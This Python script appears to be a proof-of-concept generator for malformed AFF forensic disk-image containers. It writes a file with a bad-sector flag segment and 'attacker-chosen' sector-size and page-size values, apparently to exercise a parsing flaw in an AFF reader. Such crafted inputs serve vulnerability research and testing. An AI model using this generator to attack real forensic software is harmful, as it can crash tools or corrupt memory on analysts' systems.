#!/usr/bin/env python3
"""Generate a minimal AFF container with attacker-chosen geometry segments.

AFF container framing is read from pinned vnode_aff.cpp aff_write_seg():
16-byte head (magic AFF\\0, name_len, data_len, arg, all BE except magic),
name, data, 8-byte tail (ATT\\0 + total segment length, BE).
"""
import struct
import sys


def segment(name, arg=0, data=b''):
    name = name.encode()
    head = b'AFF\0' + struct.pack('>III', len(name), len(data), arg)
    tail = b'ATT\0' + struct.pack('>I', 16 + len(name) + len(data) + 8)
    return head + name + data + tail


def main():
    out, sector, page = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
    badflag = b'BAD SECTOR' + b'\x5a' * 502
    blob = (b'AFF10\r\n\0'
            + segment('badflag', 0, badflag)
            + segment('sectorsize', sector)
            + segment('pagesize', page))
    with open(out, 'wb') as f:
        f.write(blob)
    print(f'{out} {len(blob)} bytes sector={sector} page={page}')


if __name__ == '__main__':
    main()
